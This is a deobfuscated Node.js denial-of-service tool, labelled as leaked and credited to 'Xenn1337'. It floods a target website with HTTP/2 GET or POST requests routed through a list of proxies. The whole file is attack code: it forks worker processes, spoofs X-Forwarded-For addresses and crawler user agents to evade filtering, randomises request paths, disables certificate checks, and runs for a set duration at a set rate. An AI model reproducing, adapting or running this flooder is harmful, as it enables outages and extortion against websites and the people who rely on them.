//Leaked By AnonPrixorPH
//Deobfuscated Successfully
//10-11-2023

process.on('uncaughtException', function (_0x5cc077) {})
process.on('unhandledRejection', function (_0x59c432) {})
require('events').EventEmitter.defaultMaxListeners = 0
const fs = require('fs'),
  url = require('url'),
  randstr = require('randomstring')
var path = require('path')
const cluster = require('cluster'),
  http2 = require('http2')
var fileName = __filename,
  file = path.basename(fileName)
let headerbuilders,
  COOKIES = undefined,
  POSTDATA = undefined
process.argv.length < 8 &&
  (console.log('HTTPS POWER By Xenn1337'),
  console.log(
    'node ' +
      file +
      ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")'
  ),
  process.exit(0))
let randomparam = false
var proxies = fs
    .readFileSync(process.argv[4], 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\n'),
  rate = process.argv[6],
  target_url = process.argv[3]
const target = target_url.split('""')[0]
process.argv.forEach((_0x306f0) => {
  if (
    _0x306f0.includes('cookie=') &&
    !process.argv[2].split('""')[0].includes(_0x306f0)
  ) {
    COOKIES = _0x306f0.slice(7)
  } else {
    if (
      _0x306f0.includes('postdata=') &&
      !process.argv[2].split('""')[0].includes(_0x306f0)
    ) {
      process.argv[2].toUpperCase() != 'POST' &&
        (console.error('Method Invalid (Has Postdata But Not POST Method)'),
        process.exit(1))
      POSTDATA = _0x306f0.slice(9)
    } else {
      if (_0x306f0.includes('randomstring=')) {
        randomparam = _0x306f0.slice(13)
        console.log('(!) RandomString Mode')
      } else {
        if (_0x306f0.includes('headerdata=')) {
          headerbuilders = {
            'Cache-Control': 'max-age=0',
            Referer: target,
            'X-Forwarded-For': spoof(),
            Cookie: COOKIES,
            ':method': 'GET',
          }
          if (_0x306f0.slice(11).split('""')[0].includes('&')) {
            const _0x287d25 = _0x306f0.slice(11).split('""')[0].split('&')
            for (let _0x4e4a34 = 0; _0x4e4a34 < _0x287d25.length; _0x4e4a34++) {
              const _0x9099b5 = _0x287d25[_0x4e4a34].split('=')[0],
                _0x4c393a = _0x287d25[_0x4e4a34].split('=')[1]
              headerbuilders[_0x9099b5] = _0x4c393a
            }
          } else {
            const _0x535b4 = _0x306f0.slice(11).split('""')[0],
              _0x11b8ce = _0x535b4.split('=')[0],
              _0x2c9254 = _0x535b4.split('=')[1]
            headerbuilders[_0x11b8ce] = _0x2c9254
          }
        }
      }
    }
  }
})
COOKIES !== undefined ? console.log('(!) Custom Cookie Mode') : (COOKIES = '')
POSTDATA !== undefined
  ? console.log('(!) Custom PostData Mode')
  : (POSTDATA = '')
if (headerbuilders !== undefined) {
  console.log('(!) Custom HeaderData Mode')
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork()
      console.log('Process ' + i + ' To Start Attack')
    }
    console.log('Attack Start')
    setTimeout(() => {
      process.exit(1)
    }, process.argv[5] * 1000)
  } else {
    startflood()
  }
} else {
  headerbuilders = {
    'Cache-Control': 'max-age=0',
    Referer: target,
    'X-Forwarded-For': spoof(),
    Cookie: COOKIES,
    ':method': 'GET',
  }
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork()
      console.log('Proccess ' + i + ' To Start Attack')
    }
    console.log('Attack Start')
    setTimeout(() => {
      process.exit(1)
    }, process.argv[5] * 1000)
  } else {
    startflood()
  }
}
var parsed = url.parse(target)
process.setMaxListeners(0)
function ra() {
  const _0x266a33 = randstr.generate({
    charset:
      '0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
    length: 4,
  })
  return _0x266a33
}
const UAs = [
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4183.121 Safari/537.36 (compatible; Cloudflare SpeedTest/1.0; +https://blog.cloudflare.com/new-speed-page/)',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.50',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.64',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.52',
  'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
  'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)',
  'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
]
function spoof() {
  return (
    '' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    })
  )
}
const cplist = [
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
]
function startflood() {
  if (process.argv[2].toUpperCase() == 'POST') {
    const _0x58854c = url.parse(target).path.replace('%RAND%', ra())
    headerbuilders[':method'] = 'POST'
    headerbuilders['Content-Type'] = 'text/plain'
    randomparam
      ? setInterval(() => {
          headerbuilders['User-agent'] =
            UAs[Math.floor(Math.random() * UAs.length)]
          var _0x24557d = cplist[Math.floor(Math.random() * cplist.length)],
            _0x1526bf = proxies[Math.floor(Math.random() * proxies.length)]
          _0x1526bf = _0x1526bf.split(':')
          var _0x407728 = require('http'),
            _0xe00f97 = require('tls')
          _0xe00f97.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x4f42ad = _0x407728.request(
            {
              host: _0x1526bf[0],
              port: _0x1526bf[1],
              ciphers: _0x24557d,
              method: 'CONNECT',
              path: parsed.host + ':443',
            },
            (_0x1dace1) => {
              _0x4f42ad.end()
              return
            }
          )
          _0x4f42ad.on('connect', function (_0x610476, _0x5484af, _0x2dffa2) {
            const _0xe4b4f0 = http2.connect(parsed.href, {
              createConnection: () =>
                _0xe00f97.connect(
                  {
                    host: parsed.host,
                    ciphers: _0x24557d,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: _0x5484af,
                  },
                  function () {
                    for (let _0x4caceb = 0; _0x4caceb < rate; _0x4caceb++) {
                      headerbuilders[':path'] =
                        url.parse(target).path.replace('%RAND%', ra()) +
                        '?' +
                        randomparam +
                        '=' +
                        randstr.generate({
                          length: 12,
                          charset:
                            'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
                        })
                      headerbuilders['X-Forwarded-For'] = spoof()
                      headerbuilders.Body =
                        '' +
                        (POSTDATA.includes('%RAND%')
                          ? POSTDATA.replace('%RAND%', ra())
                          : POSTDATA)
                      headerbuilders.Cookie.replace('%RAND%', ra())
                      const _0x24c29f = _0xe4b4f0.request(headerbuilders)
                      _0x24c29f.end()
                      _0x24c29f.on('response', () => {
                        _0x24c29f.close()
                      })
                    }
                  }
                ),
            })
          })
          _0x4f42ad.end()
        })
      : setInterval(() => {
          headerbuilders['User-agent'] =
            UAs[Math.floor(Math.random() * UAs.length)]
          var _0xf83c07 = cplist[Math.floor(Math.random() * cplist.length)],
            _0x146d6 = proxies[Math.floor(Math.random() * proxies.length)]
          _0x146d6 = _0x146d6.split(':')
          var _0x34b6f1 = require('http'),
            _0x4b4924 = require('tls')
          _0x4b4924.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x4fad16 = _0x34b6f1.request(
            {
              host: _0x146d6[0],
              port: _0x146d6[1],
              ciphers: _0xf83c07,
              method: 'CONNECT',
              path: parsed.host + ':443',
            },
            (_0x2f9d70) => {
              _0x4fad16.end()
              return
            }
          )
          _0x4fad16.on('connect', function (_0x26f5f6, _0x5c9bdc, _0x540c41) {
            const _0x4d91dd = http2.connect(parsed.href, {
              createConnection: () =>
                _0x4b4924.connect(
                  {
                    host:
                      '' +
                      (url.parse(target).path.includes('%RAND%')
                        ? _0x58854c
                        : url.parse(target).path),
                    ciphers: _0xf83c07,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: _0x5c9bdc,
                  },
                  function () {
                    for (let _0x2d1c69 = 0; _0x2d1c69 < rate; _0x2d1c69++) {
                      headerbuilders[':path'] =
                        '' + url.parse(target).path.replace('%RAND%', ra())
                      headerbuilders['X-Forwarded-For'] = spoof()
                      headerbuilders.Body =
                        '' +
                        (POSTDATA.includes('%RAND%')
                          ? POSTDATA.replace('%RAND%', ra())
                          : POSTDATA)
                      headerbuilders.Cookie.replace('%RAND%', ra())
                      const _0x1a37c0 = _0x4d91dd.request(headerbuilders)
                      _0x1a37c0.end()
                      _0x1a37c0.on('response', () => {
                        _0x1a37c0.close()
                      })
                    }
                  }
                ),
            })
          })
          _0x4fad16.end()
        })
  } else {
    process.argv[2].toUpperCase() == 'GET'
      ? ((headerbuilders[':method'] = 'GET'),
        randomparam
          ? setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x55c399 = cplist[Math.floor(Math.random() * cplist.length)],
                _0xc78bf7 = proxies[Math.floor(Math.random() * proxies.length)]
              _0xc78bf7 = _0xc78bf7.split(':')
              var _0x452d99 = require('http'),
                _0x42cb6c = require('tls')
              _0x42cb6c.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x27c46d = _0x452d99.request(
                {
                  host: _0xc78bf7[0],
                  port: _0xc78bf7[1],
                  ciphers: _0x55c399,
                  method: 'CONNECT',
                  path: parsed.host + ':443',
                },
                (_0x2bd76d) => {
                  _0x27c46d.end()
                  return
                }
              )
              _0x27c46d.on(
                'connect',
                function (_0xa28122, _0x2e3f37, _0x3ce0d9) {
                  const _0x1e864e = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x42cb6c.connect(
                        {
                          host: parsed.host,
                          ciphers: _0x55c399,
                          secureProtocol: 'TLS_method',
                          servername: parsed.host,
                          secure: true,
                          rejectUnauthorized: false,
                          ALPNProtocols: ['h2'],
                          socket: _0x2e3f37,
                        },
                        function () {
                          for (
                            let _0x48aa3f = 0;
                            _0x48aa3f < rate;
                            _0x48aa3f++
                          ) {
                            headerbuilders[':path'] =
                              url.parse(target).path.replace('%RAND%', ra()) +
                              '?' +
                              randomparam +
                              '=' +
                              randstr.generate({
                                length: 12,
                                charset:
                                  'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
                              })
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('%RAND%', ra())
                            const _0x3dabce = _0x1e864e.request(headerbuilders)
                            _0x3dabce.end()
                            _0x3dabce.on('response', () => {
                              _0x3dabce.close()
                            })
                          }
                        }
                      ),
                  })
                }
              )
              _0x27c46d.end()
            })
          : setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x1b7087 = cplist[Math.floor(Math.random() * cplist.length)],
                _0x381722 = proxies[Math.floor(Math.random() * proxies.length)]
              _0x381722 = _0x381722.split(':')
              var _0x793f2d = require('http'),
                _0x4724a8 = require('tls')
              _0x4724a8.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x1a3f1e = _0x793f2d.request(
                {
                  host: _0x381722[0],
                  port: _0x381722[1],
                  ciphers: _0x1b7087,
                  method: 'CONNECT',
                  path: parsed.host + ':443',
                },
                (_0xda66b7) => {
                  _0x1a3f1e.end()
                  return
                }
              )
              _0x1a3f1e.on(
                'connect',
                function (_0xedea84, _0x1cf423, _0x565c3b) {
                  const _0x4fa3e3 = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x4724a8.connect(
                        {
                          host: parsed.host,
                          ciphers: _0x1b7087,
                          secureProtocol: 'TLS_method',
                          servername: parsed.host,
                          secure: true,
                          rejectUnauthorized: false,
                          ALPNProtocols: ['h2'],
                          socket: _0x1cf423,
                        },
                        function () {
                          for (
                            let _0x1dc998 = 0;
                            _0x1dc998 < rate;
                            _0x1dc998++
                          ) {
                            headerbuilders[':path'] =
                              '' +
                              url.parse(target).path.replace('%RAND%', ra())
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('%RAND%', ra())
                            const _0x536ca2 = _0x4fa3e3.request(headerbuilders)
                            _0x536ca2.end()
                            _0x536ca2.on('response', () => {
                              _0x536ca2.close()
                            })
                          }
                        }
                      ),
                  })
                }
              )
              _0x1a3f1e.end()
            }))
      : (console.log('Method Error'), process.exit(1))
  }
}
